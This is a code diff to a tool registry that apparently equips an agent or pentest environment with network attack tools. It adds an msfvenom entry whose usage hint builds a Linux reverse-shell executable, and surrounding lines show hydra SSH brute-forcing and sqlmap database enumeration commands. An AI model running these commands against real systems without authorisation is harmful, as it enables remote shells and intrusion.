@@ -928,6 +928,7 @@ const networkBucket: CapabilityBucket = {
 - dig: dig @<dns_server> <domain> ANY — DNS enumeration
 - hydra: hydra -l admin -P wordlist.txt <target> ssh — brute-force logins
 - sqlmap: sqlmap -u "http://target/page?id=1" --batch --dbs
+- msfvenom: msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o output — generate payloads
 Python: paramiko (SSH), dnspython (DNS), impacket (SMB/Kerberos/LDAP)`,
   capabilities: [
     {
@@ -996,6 +997,18 @@ Python: paramiko (SSH), dnspython (DNS), impacket (SMB/Kerberos/LDAP)`,
       installCommand: "apt install -y sqlmap",
       checkCommand: "which sqlmap",
       size: "20 MB",
+    },
+    {
+      name: "msfvenom",
+      type: "binary",
+      bucket: "network",
+      label: "msfvenom",
+      description:
+        "Metasploit payload generator. Create reverse shells, meterpreter payloads, and encoded shellcode in various formats.",
+      usageHint: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf",
+      installCommand: "apt install -y metasploit-framework",
+      checkCommand: "which msfvenom",
+      size: "500 MB",
     },
     {
       name: "ffuf",
